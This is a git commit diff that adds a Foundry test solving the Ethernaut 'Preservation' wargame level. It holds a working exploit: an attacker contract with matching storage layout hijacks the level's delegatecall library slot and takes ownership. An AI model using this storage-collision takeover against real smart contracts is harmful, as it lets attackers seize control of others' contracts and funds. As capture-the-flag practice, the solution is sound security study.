05efac69c70548dcc3359ece45c6169470ed1e1c
islu <38793955+islu@users.noreply.github.com>
2024-04-18 17:14:54 +0800

    solve challenge (Preservation)

--- test/Preservation.t.sol
+++ test/Preservation.t.sol
@@ -5,9 +5,11 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {PreservationFactory} from "../src/factories/PreservationFactory.sol";
 import {Preservation} from "../src/levels/Preservation.sol";
 
+import "forge-std/console.sol";
+
 contract PreservationTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         PreservationFactory factory = new PreservationFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
@@ -16,8 +18,41 @@ contract PreservationTest is EthernautTest {
     function testSolvePreservation() public {
         Preservation instance = Preservation(payable(levelAddress));
 
-	// insert your code here!
-	
+        // [START]
+
+        console.log("[Before] owner: ", instance.owner());
+
+        // 1. Deploy attacker contract
+        PreservationAttack attacker = new PreservationAttack(
+            payable(levelAddress)
+        );
+
+        instance.setFirstTime(uint256(uint160(address(attacker))));
+        instance.setFirstTime(uint256(uint160(address(this))));
+
+        console.log("[After] owner: ", instance.owner());
+        // console.log("player: ", address(this));
+        assertEq(instance.owner(), address(this));
+
+        // [END]
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+// Attacker contract
+contract PreservationAttack {
+    address public addr1;
+    address public addr2;
+    address public owner;
+    Preservation public target;
+
+    constructor(address _target) {
+        target = Preservation(_target);
+        addr1 = address(this);
+    }
+
+    function setTime(uint256 _time) external {
+        owner = address(uint160(_time));
     }
 }
